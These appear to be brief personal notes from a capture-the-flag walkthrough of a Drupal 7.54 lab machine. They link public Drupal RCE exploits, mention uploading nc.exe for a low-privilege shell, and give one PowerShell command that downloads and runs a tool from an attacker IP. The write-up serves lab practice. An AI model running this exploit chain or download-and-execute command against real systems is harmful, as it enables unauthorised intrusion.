* Found Drupal version 7.54 in changelog file
* Google for exploits and find one that works and gives code execution
	* https://github.com/pimps/CVE-2018-7600
	* 
![[Pasted image 20210522161800.png]]
* This RCE ends up not being super useful, so try different cve
* Try using exploit https://www.ambionics.io/blog/drupal-services-module-rce
* From Ippsec's bastard video, make code adjustments for file upload and code execution:
![[Pasted image 20210522173826.png]]
![[Pasted image 20210522173946.png]]
* Use RCE to upload nc.exe
* Get shell as low priv user 
![[Pasted image 20210522174159.png]]
![[Pasted image 20210522174244.png]]
* manage to get sherlock running on box using command:
```shell
fexec=echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.9:8000/sherlock.exe") | powershell -noprofile -
```
![[Pasted image 20210523113332.png]]